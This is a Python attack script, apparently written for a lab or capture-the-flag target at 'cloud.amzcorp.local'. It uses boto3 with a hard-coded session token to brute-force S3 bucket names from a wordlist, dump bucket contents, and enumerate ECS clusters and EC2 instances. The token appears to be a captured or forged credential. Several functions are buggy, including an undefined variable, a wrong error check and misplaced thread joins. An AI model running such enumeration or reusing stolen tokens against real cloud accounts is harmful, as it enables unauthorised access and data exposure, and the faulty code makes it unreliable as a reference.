import boto3
import queue
from threading import Thread
import asyncio


class S3:
    def __init__(self, region_name='eu-east-1', format='json', ssl=False, bucket_name=None, endpoint_url=None, v=0):
        if endpoint_url == None:
            endpoint_url = f'https://{region_name}.amazonaws.com'
        self.client = boto3.resource(
            's3', use_ssl=ssl, region_name=region_name, endpoint_url=endpoint_url, aws_session_token="eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InJlYmVjY2EiLCJlbWFpbCI6InJlYmVjY2FAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjpmYWxzZX0.0pSXzicI1F7OPPExwiEynIvXzAfPbPQ8RKLSXqFXZD-U8T3zYPWAhyEAik78fj1dN-6ReEmTPm2WslMNXEYTPg")
        self.s3 = self.client
        self.v = v
        if bucket_name != None:
            self.buckets = [bucket_name]
        else:
            self.buckets = []

    def list_buckets(self):
        try:
            buckets = self.s3.buckets.all()
            b = []
            for bucket in buckets:
                b.append(bucket.name)
                if v > 0:
                    print(f"found bucket: {bucket.name} by listing buckets..")
            return b
        except Exception as e:
            #print(e)
            None
            return None

    def list_content(self, bucket_name, v=1):
        objs = self.s3.Bucket(bucket_name).objects.all()
        if v > 0:
            for obj in objs:
                if "An error occurred (403) when calling the ListObjects operation: Forbidden" not in str(obj):
        	        print(obj)
        else:
            if "An error occurred (403) when calling the ListObjects operation: Forbidden" not in objs:
                print(f'found bucket: {bucket_name} by brute forcing..')
                self.buckets.append(bucket_name)
            
        
        

        return objs

    def brute_search(self, wordlist='./wordlists/s3-list.txt', threads=30):
        wordlist = open(wordlist, 'r').readlines()
        list_b = queue.Queue()
        for word in wordlist:
            word = word.strip()
            if len(word) > 0:
                list_b.put(word)

        def force():
            while not list_b.empty():
                    name = list_b.get()
                    try:
                            self.list_content(bucket_name=name, v=0)
                            #self.list_content(bucket_name=name)
                            
                    except Exception as e:
                            #print(e)
                            None
        threads_list = []
        for thread in range(threads):
            t = Thread(target=force)
            
            t.start()
            threads_list.append(t)
        for thread in threads_list:
            thread.join()
        
        if len(self.buckets) > 0:
            print("################################################################")
            for bucket in self.buckets:
                print(f'listing content in bucket: {bucket}')
                try:
                    self.list_content(bucket_name=bucket)
                except Exception as e:
                    print(e)
                
                    print("############################################################################")
        # while not list_b.empty():
        #         asyncio.run(force(list_b))

class ECS:
    def __init__(self, region_name='eu-east-1', format='json', endpoint_url=None, cluster=None):
        if endpoint_url is None:
            endpoint_url = f'https://{region_name}.amazonaws.com'
        self.client = boto3.client('ecs', region_name=region_name, endpoint_url=endpoint_url,aws_session_token="eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InJlYmVjY2EiLCJlbWFpbCI6InJlYmVjY2FAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjpmYWxzZX0.0pSXzicI1F7OPPExwiEynIvXzAfPbPQ8RKLSXqFXZD-U8T3zYPWAhyEAik78fj1dN-6ReEmTPm2WslMNXEYTPg")
        self.clusters = [cluster]
        self.ecs = self.client

    def list_clusters(self, cluster_name=None, v=1):
        response = self.ecs.list_clusters()
        cluster_arns = response['clusterArns']
        for arn in cluster_arns:
            if v > 0:
                print(f'found cluster info: {arn}')
            else:
                print(f'found cluster: {arn}')
            self.clusters.append(arn)

    def brute_search(self, wordlist='./wordlists/s3-list.txt', threads=30):
        wordlist = open(wordlist, 'r').readlines()
        list_c = queue.Queue()
        for word in wordlist:
            word = word.strip()
            if len(word) > 0:
                list_c.put(word)

        def force():
            while not list_c.empty():
                try:
                    self.list_clusters(cluster_name=list_c.get(), v=0)
                except Exception as e:
                    #print(e)
                    None

        threads_list = []
        for thread in range(threads):
            t = Thread(target=force)
            t.daemon = True
            t.start()
            threads_list.append(t)

        for thread in threads_list:
            thread.join()


class EC2:
    def __init__(self, region_name='eu-east-1', format='json', endpoint_url=None):
        if endpoint_url is None:
            endpoint_url = f'https://{region_name}.amazonaws.com'
        self.client = boto3.resource('ec2', region_name=region_name, endpoint_url=endpoint_url,aws_session_token="eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InJlYmVjY2EiLCJlbWFpbCI6InJlYmVjY2FAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjpmYWxzZX0.0pSXzicI1F7OPPExwiEynIvXzAfPbPQ8RKLSXqFXZD-U8T3zYPWAhyEAik78fj1dN-6ReEmTPm2WslMNXEYTPg")

    def list_instances(self):
        response = self.client.describe_instances()
        reservations = response['Reservations']
        for reservation in reservations:
            instances = reservation['Instances']
            for instance in instances:
                instance_id = instance['InstanceId']
                instance_name = ''
                for tag in instance['Tags']:
                    if tag['Key'] == 'Name':
                        instance_name = tag['Value']
                        break
                print(f'Instance ID: {instance_id}, Instance Name: {instance_name}')

    def brute_search(self, wordlist='./wordlists/s3-list.txt', threads=30):
        wordlist = open(wordlist, 'r').readlines()
        list_c = queue.Queue()
        for word in wordlist:
            word = word.strip()
            if len(word) > 0:
                list_c.put(word)

        def force():
            while not list_c.empty():
                try:
                    self.list_instances()
                except Exception as e:
                    print(e)
                    #None
        threads_list = []
        for _ in range(threads):
            t = Thread(target=force)
            t.daemon = True
            t.start()
            threads_list.append(t)
            for thread in threads_list:
                thread.join()








print('listing s3 buckets')
s3 = S3(region_name='eu-east-1', format='json',
        endpoint_url='http://cloud.amzcorp.local')
s3.brute_search()

print('enumerating ecs clusters and instances')
ecs = ECS(region_name='eu-east-1', format='json',
          endpoint_url='http://cloud.amzcorp.local')
ecs.brute_search()
print('listing ec2 clusters and instances')
ec2 = EC2(region_name='eu-east-1', format='json',
          endpoint_url='http://cloud.amzcorp.local')
ec2.brute_search()